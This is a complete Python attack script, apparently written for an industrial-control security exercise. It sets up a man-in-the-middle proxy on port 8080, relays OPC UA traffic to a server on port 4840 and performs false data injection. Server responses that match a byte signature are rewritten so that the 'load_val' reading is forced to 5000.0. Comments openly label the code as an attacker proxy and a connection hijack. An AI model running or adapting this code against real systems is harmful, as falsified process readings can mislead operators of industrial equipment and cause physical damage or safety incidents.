import socket
import threading
import struct

# --- CONFIGURATION ---
PROXY_IP = "0.0.0.0" 
PROXY_PORT = 8080  # Matches the 'connectport' in netsh
REAL_SERVER_IP = "10.204.157.171"
REAL_SERVER_PORT = 4840

# Signature for load_val (Handle 2 + Status Good)
TARGET_BYTES = b'\x02\x00\x00\x00\x00\x00\x00\x00'
FAKE_VALUE = struct.pack('<f', 5000.0) 

def bridge(src, dst, is_server_to_client):
    while True:
        try:
            data = src.recv(16384)
            if not data:
                break
            
            # THE ATTACK: Modify data coming FROM the Server
            if is_server_to_client and TARGET_BYTES in data:
                idx = data.find(TARGET_BYTES)
                val_pos = idx + 16
                if len(data) >= val_pos + 4:
                    data = data[:val_pos] + FAKE_VALUE + data[val_pos+4:]
                    print("[!] FDI SUCCESS: load_val forced to 5000.0")

            dst.sendall(data)
        except:
            break
    src.close()
    dst.close()

def start_attacker_proxy():
    proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_sock.bind((PROXY_IP, PROXY_PORT))
    proxy_sock.listen(10)
    print(f"[*] Attacker Proxy listening on {PROXY_PORT}...")

    while True:
        client_conn, addr = proxy_sock.accept()
        print(f"[*] Connection Hijacked from {addr}")
        
        server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_conn.connect((REAL_SERVER_IP, REAL_SERVER_PORT))

        threading.Thread(target=bridge, args=(client_conn, server_conn, False), daemon=True).start()
        threading.Thread(target=bridge, args=(server_conn, client_conn, True), daemon=True).start()

if __name__ == "__main__":
    start_attacker_proxy()